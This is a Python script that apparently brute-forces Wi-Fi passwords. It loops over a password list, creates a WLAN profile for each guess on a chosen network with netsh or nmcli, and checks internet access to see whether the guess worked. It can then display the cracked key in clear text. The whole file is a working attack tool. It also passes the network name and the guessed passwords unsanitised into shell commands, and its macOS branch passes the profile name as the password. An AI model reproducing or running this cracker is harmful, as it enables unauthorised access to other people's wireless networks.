import os
import platform
import time
import subprocess
import requests

url = "http://www.python.org"
timeout = 5

def createNewConnection(name, SSID, key):
    global command
    config = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{name}</name>
    <SSIDConfig>
        <SSID>
            <name>{SSID}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{key}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = f"netsh wlan add profile filename=\"{name}.xml\" interface=Wi-Fi"
        with open(f"{name}.xml", "w") as file:
            file.write(config)
    elif platform.system() == "Linux" or platform.system() == "Darwin":  # For macOS
        command = f"nmcli dev wifi connect '{SSID}' password '{key}'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(f"{name}.xml")

def connect(name, SSID):
    if platform.system() == "Windows":
        os.system(f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi")
    elif platform.system() == "Linux":
        # Assuming Linux uses nmcli for connection
        os.system(f"nmcli con up id '{SSID}'")
    elif platform.system() == "Darwin":  # For macOS
        # Assuming macOS uses networksetup command for connection
        os.system(f"/usr/sbin/networksetup -setairportnetwork en0 '{SSID}' '{name}'")

def displayAvailableNetworks():
    if platform.system() == "Windows":
        os.system("netsh wlan show networks interface=Wi-Fi")
    elif platform.system() == "Linux":
        os.system("nmcli dev wifi list")
    elif platform.system() == "Darwin":  # For macOS
        os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s")

print("[LOADING] Searching if connected to any network")

try:
    request = requests.get(url, timeout=timeout)
    print("[-] Please disconnect your internet for this operation to work, try again later")
    exit()
except (requests.ConnectionError, requests.Timeout):
    print("[LOADING] Loading program...")
    time.sleep(1)

connected = True
while connected:
    try:
        displayAvailableNetworks()
        WIFI = input("WIFI Name: ")
        with open("/Volumes/DRIVE/PYTHON/WIFI HACK/Brute Force Passwords.txt", "r") as f:
            for line in f:
                words = line.split()
                if words:
                    print(f"Password: {words[0]}")
                    createNewConnection(WIFI, WIFI, words[0])
                    connect(WIFI, WIFI)
                    try:
                        request = requests.get(url, timeout=timeout)
                        connected = False
                        choice = input(f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
                        if choice.lower() == "y":
                            print("\n[EXITING] Operation canceled")
                            exit()
                        elif choice.lower() == "n":
                            print("\n[-] Operation continues\n")
                    except (requests.ConnectionError, requests.Timeout):
                        print("[LOADING] Loading program...")
                        time.sleep(1)

        print("[+] Operation complete")
        choice = input("See WIFI Information (y/N) ? ")
        if choice.lower() == "y":
            print(f"[LOADING] Searching for {WIFI} network")
            time.sleep(1)
            if platform.system() == "Windows":
                os.system(f"netsh wlan show profile name=\"{WIFI}\" key=clear")
            elif platform.system() == "Linux":
                os.system(f"nmcli dev wifi show '{WIFI}'")
            elif platform.system() == "Darwin":
                os.system(f"/usr/sbin/networksetup -getairportnetwork en0")
            exit()
        elif choice.lower() == "n":
            print("\n[EXITING] Exiting program...")
            time.sleep(2)
            exit()
    except KeyboardInterrupt:
        print("\n[EXITING] Aborting program...")
        exit()
